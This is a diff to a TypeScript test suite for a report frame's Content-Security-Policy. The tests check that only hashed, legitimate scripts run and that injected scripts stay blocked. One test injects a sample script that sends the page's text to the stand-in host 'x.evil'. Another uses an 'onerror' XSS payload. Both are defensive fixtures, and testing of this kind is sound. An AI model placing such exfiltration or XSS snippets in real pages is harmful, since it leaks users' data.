@@ -1,3 +1,4 @@
+import { createHash } from 'crypto';
 import { readFileSync } from 'fs';
 import { JSDOM } from 'jsdom';
 import { join } from 'path';
@@ -10,6 +11,9 @@ import {
   EXAM_CSP_META,
   FRAME_LOCK_HEAD,
   FRAME_LOCK_SCRIPT,
+  cspScriptHash,
+  frameCsp,
+  frameLockHeadOf,
   PREFETCH_OFF_META,
   neutralizeRefusedTags,
   withFrameLock,
@@ -28,6 +32,17 @@ import {
   sheetLabel,
   withExamCsp,
 } from './examRoom';
+
+/** The lock a v2 frame document opens with, found and checked against the one built for it. */
+const LOCK_TAIL = `${PREFETCH_OFF_META}<script>${FRAME_LOCK_SCRIPT}</script>`;
+function lockOf(html: string): string {
+  const at = html.indexOf('<meta http-equiv="Content-Security-Policy" content="');
+  const end = html.indexOf(LOCK_TAIL);
+  if (at < 0 || end < at) throw new Error('no frame lock');
+  const head = html.slice(at, end + LOCK_TAIL.length);
+  expect(head).toBe(frameLockHeadOf(html.replace(head, '')));
+  return head;
+}
 
 const PHONE = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" /><style>x{}</style></head><body><main class="sheet" data-sheet="1">a</main><section class="sheet back" data-sheet="2">b</section><script>/*reflow*/</script></body></html>';
 
@@ -72,7 +87,7 @@ describe('examRoomHtml', () => {
     expect(out).not.toBeNull();
     const html = out as string;
     // Every byte of the reflow survives, in order: the mode only inserts.
-    const stripped = html.replace(/<style id="nyx-exam-style">[\s\S]*?<\/style>\n/, '').replace(/<script id="nyx-exam-script">[\s\S]*?<\/script>\n/, '').replace(FRAME_LOCK_HEAD, '').replace(EXAM_VIEWPORT, '<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />');
+    const stripped = html.replace(/<style id="nyx-exam-style">[\s\S]*?<\/style>\n/, '').replace(/<script id="nyx-exam-script">[\s\S]*?<\/script>\n/, '').replace(lockOf(html), '').replace(EXAM_VIEWPORT, '<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />');
     expect(stripped).toBe(PHONE);
   });
 
@@ -224,14 +239,15 @@ describe('the frame lock (CUL-2469, CUL-2495)', () => {
   it('opens the head of every v2 frame document: CSP, prefetch off, the lock script, before any server markup', () => {
     const doc = '<!DOCTYPE html><html><head><meta charset="utf-8" /><style>x{}</style></head><body><script>/*s*/</script></body></html>';
     const locked = withFrameLock(doc) as string;
-    expect(locked.startsWith(`<!DOCTYPE html><html><head>${FRAME_LOCK_HEAD}<meta charset`)).toBe(true);
-    expect(FRAME_LOCK_HEAD.indexOf(EXAM_CSP_META)).toBe(0);
+    expect(locked.startsWith(`<!DOCTYPE html><html><head>${frameLockHeadOf(doc)}<meta charset`)).toBe(true);
+    expect(FRAME_LOCK_HEAD.indexOf(`<meta http-equiv="Content-Security-Policy" content="${frameCsp([cspScriptHash(FRAME_LOCK_SCRIPT)])}">`)).toBe(0);
     expect(FRAME_LOCK_HEAD).toContain(PREFETCH_OFF_META);
     expect(PREFETCH_OFF_META).toBe('<meta http-equiv="x-dns-prefetch-control" content="off">');
     expect(FRAME_LOCK_HEAD.indexOf(PREFETCH_OFF_META)).toBeLessThan(FRAME_LOCK_HEAD.indexOf('<script>'));
     expect(withFrameLock('no head')).toBeNull();
     // The room's own documents take it, both of them.
-    expect(examRoomHtml(PHONE, '#0A0A0A')).toContain(`<head>${FRAME_LOCK_HEAD}`);
+    const room = examRoomHtml(PHONE, '#0A0A0A') as string;
+    expect(room).toContain(`<head>${lockOf(room)}`);
   });
 
   it('the v1 box is unchanged: CSP only (CUL-2527 moves v1 separately)', () => {
@@ -476,7 +492,8 @@ describe('no report frame can be blanked by its own content', () => {
     expect(examRoomHtml(injected, '#0A0A0A')).not.toMatch(/<meta http-equiv=refresh/i);
     expect(withFrameLock(`<html><head></head><body>${REFRESHES[0]}</body></html>`)).not.toMatch(/<meta http-equiv=refresh/i);
     // Still holds the lock's own metas.
-    expect(examRoomHtml(injected, '#0A0A0A')).toContain(EXAM_CSP_META);
+    const room = examRoomHtml(injected, '#0A0A0A') as string;
+    expect(room).toContain(`<head>${lockOf(room)}`);
   });
 
   /** A locked window with stand-ins for the Navigation API, which jsdom lacks. */
@@ -538,5 +555,97 @@ describe('no report frame can be blanked by its own content', () => {
       expect(s.length).toBeGreaterThan(100);
       expect(s).not.toMatch(/\blocation\b|\bhistory\b|\bnavigation\b|http-equiv/);
     }
+  });
+});
+
+// CUL-2531, CUL-2561: a v2 frame runs only the scripts the report legitimately carries. The policy
+// names each by hash, so an injected script, a handler attribute and a `javascript:` URL never run.
+describe('only our own scripts run (CUL-2531)', () => {
+  const nodeHash = (text: string) => `'sha256-${createHash('sha256').update(text, 'utf8').digest('base64')}'`;
+  const scriptSrc = (html: string) => (/script-src ([^;]*);/.exec(lockOf(html))?.[1] ?? '').split(' ');
+  /** The hash of every script the parser will actually run in this document, as the engine sees it. */
+  const parsedScriptHashes = (html: string) =>
+    [...new JSDOM(html).window.document.querySelectorAll('script')].map((el) => nodeHash(el.textContent ?? ''));
+
+  it('hashes exactly as the engines do (SHA-256 of the UTF-8 text, base64), on every shape of input', () => {
+    const phone = readFileSync(join(__dirname, '../supabase/functions/generate-report/renderPhoneV2.ts'), 'utf8');
+    const samples = ['', 'abc', 'é', '💊 dose', '\ud800 lone', 'a\r\nb', FRAME_LOCK_SCRIPT, phone];
+    // Every padding boundary (55, 56, 63, 64 bytes and their neighbours) and multi-block lengths.
+    for (let n = 0; n < 200; n++) samples.push('x'.repeat(n));
+    let seed = 7;
+    const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
+    for (let i = 0; i < 100; i++) {
+      let t = '';
+      const len = Math.floor(rnd() * 300);
+      for (let j = 0; j < len; j++) t += String.fromCodePoint(Math.floor(rnd() * (rnd() < 0.8 ? 0x80 : 0x1ffff)));
+      samples.push(t);
+    }
+    for (const t of samples) expect(cspScriptHash(t)).toBe(nodeHash(t));
+  });
+
+  it('the room lists the lock, the reflow and the room script by hash, and nothing inline', () => {
+    const room = examRoomHtml(PHONE, '#0A0A0A') as string;
+    const src = scriptSrc(room);
+    expect(src.join(' ')).not.toMatch(/unsafe|nonce|\*|:/);
+    expect(src).toHaveLength(3);
+    // Each listed hash is a script the parsed document really runs, and every script it runs is listed.
+    expect([...src].sort()).toEqual([...new Set(parsedScriptHashes(room))].sort());
+    expect(src).toContain(nodeHash('/*reflow*/'));
+    // The hash is of the text after the rename, which is the text that runs: a script holding a
+    // refused tag's spelling is listed as renamed.
+    const spelled = examRoomHtml(PHONE.replace('/*reflow*/', 'var s = "<a href=x>";'), '#000') as string;
+    expect([...scriptSrc(spelled)].sort()).toEqual([...new Set(parsedScriptHashes(spelled))].sort());
+  });
+
+  it('the preview’s phone frame lists the lock and the reflow; a printed page, only the lock', () => {
+    const phone = withFrameLock(PHONE) as string;
+    expect(scriptSrc(phone).sort()).toEqual([nodeHash(FRAME_LOCK_SCRIPT), nodeHash('/*reflow*/')].sort());
+    const printed = withFrameLock('<!DOCTYPE html><html><head></head><body><main>bars</main></body></html>') as string;
+    expect(scriptSrc(printed)).toEqual([nodeHash(FRAME_LOCK_SCRIPT)]);
+    expect(lockOf(printed)).toBe(FRAME_LOCK_HEAD);
+  });
+
+  it('an injected script, anywhere before the tail, is never listed, so it never runs', () => {
+    const evil = '<script>new Image().src="https://x.evil/?"+document.body.innerText</script>';
+    for (const at of ['<body>', '<main class="sheet" data-sheet="1">', '</section>']) {
+      const injected = PHONE.replace(at, at === '</section>' ? `${evil}${at}` : `${at}${evil}`);
+      for (const html of [examRoomHtml(injected, '#000') as string, withFrameLock(injected) as string]) {
+        const src = scriptSrc(html);
+        expect(src.join(' ')).not.toMatch(/unsafe/);
+        expect(src).not.toContain(nodeHash('new Image().src="https://x.evil/?"+document.body.innerText'));
+        // The injection did not force the fallback: the reflow is still hashed, alone with the lock.
+        expect(src).toContain(nodeHash('/*reflow*/'));
+      }
+    }
+    // A handler attribute or a javascript: URL needs 'unsafe-inline' (or 'unsafe-hashes'): never listed.
+    const room = examRoomHtml(PHONE.replace('<body>', '<body><img src=x onerror="alert(1)">'), '#000') as string;
+    expect(lockOf(room)).not.toMatch(/unsafe-inline'[^;]*;\s*style|unsafe-hashes/);
+    expect(scriptSrc(room)).not.toContain("'unsafe-inline'");
+  });
+
+  it('a script it cannot account for keeps the inline policy, the louder side, never a blocked layout', () => {
+    // A bare script with no renderer tail (a renderer whose markup moved).
+    const moved = '<!DOCTYPE html><html><head></head><body><script>/*reflow*/</script><main data-sheet="1">a</main></body></html>';
+    expect(lockOf(withFrameLock(moved) as string)).toContain(`content="${EXAM_CSP}"`);
+    // A tail script the tokenizer could read differently from the pattern.
+    const odd = PHONE.replace('/*reflow*/', '<!-- x');
+    expect(lockOf(withFrameLock(odd) as string)).toContain(`content="${EXAM_CSP}"`);
+    // The room's slot holding anything but the room's own script.
+    const room = examRoomHtml(PHONE, '#000') as string;
+    const tampered = room.replace('var page = 0;', 'var page = 1;').replace(lockOf(room), '');
+    expect(lockOf(withFrameLock(tampered) as string)).toContain(`content="${EXAM_CSP}"`);
+  });
+
+  // The renderer's script is found by where it sits. A renderer that moves it, or gives it a tag
+  // the tail pattern does not read, would fall back to the inline policy: red here first.
+  it('renderPhoneV2 ends its document with its one bare script, nothing after it', () => {
+    const src = readFileSync(join(__dirname, '../supabase/functions/generate-report/renderPhoneV2.ts'), 'utf8');
+    expect(src).toContain('<script>${SCRIPT_PHONE}</script>\n</body>\n</html>`');
+    expect(src.match(/<script/g)).toHaveLength(1);
+    const start = src.indexOf('const SCRIPT_PHONE = `');
+    const script = src.slice(start, src.indexOf('`', start + 22));
+    expect(script).not.toMatch(/<\/script|<!--/i);
+    // No handler attribute in the markup: it would never run under a hashed policy.
+    expect(src.replace(script, '')).not.toMatch(/<[a-z][^>]*\son[a-z]+=/i);
   });
 });
